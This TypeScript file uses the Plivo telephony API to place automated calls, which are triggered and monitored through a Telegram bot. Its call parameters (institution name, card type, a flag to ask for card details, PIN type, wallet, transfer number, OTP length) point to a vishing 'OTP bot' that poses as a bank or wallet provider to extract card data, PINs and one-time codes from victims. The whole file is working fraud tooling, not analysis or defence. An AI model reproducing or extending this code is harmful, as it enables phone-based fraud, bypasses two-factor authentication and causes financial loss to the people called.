/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable no-console */
import { Client } from 'plivo';
import { bot } from '..';
import { CallInputType } from '../types';

export const client = new Client(
  process.env.PLIVO_AUTH_ID,
  process.env.PLIVO_AUTH_TOKEN,
);

export const plivoMakeACall: any = async ({
  institutionName,
  to,
  from,
  step,
  wallet,
  cardType,
  askCardInfo,
  chatId,
  transferNumber,
  pinType,
  customMessage,
  actions,
  otpLength,
}: CallInputType) => {
  const language =
    /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(
      to,
    )
      ? 'en-GB'
      : 'en-US';
  client.calls
    .create(
      from, // from
      to, // to
      `${process.env.ENDPOINT_URL}/answer/${step}/${language}/?institutionName=${institutionName}&cardType=${cardType}&askCardInfo=${askCardInfo}&transferNumber=${transferNumber}&pinType=${pinType}&wallet=${wallet}&customMessage=${customMessage}&actions=${actions}&from=${from}&to=${to}&chatId=${chatId}&otpLength=${otpLength}`, // answer url

      {
        answerMethod: 'GET',
        ringUrl: `${process.env.ENDPOINT_URL}/calls/${chatId}`,
        // actionUrl: `${process.env.ENDPOINT_URL}/calls/${chatId}`,
        hangupUrl: `${process.env.ENDPOINT_URL}/calls/${chatId}`,
        callbackUrl: `${process.env.ENDPOINT_URL}/calls/${chatId}`,
        machineDetectionUrl: `${process.env.ENDPOINT_URL}/calls/${chatId}`,
        machineDetection: true,
      },
    )
    .then(
      async (response) => {
        console.log(response);

        await bot.telegram.sendMessage(chatId, `Calling (${to}) 📞`);
      },
      async (err) => {
        console.error(err);

        await bot.telegram.sendMessage(
          chatId,
          `Something went wrong try again later.`,
        );
        await bot.context.scene?.enter('super-wizard');
      },
    );
};
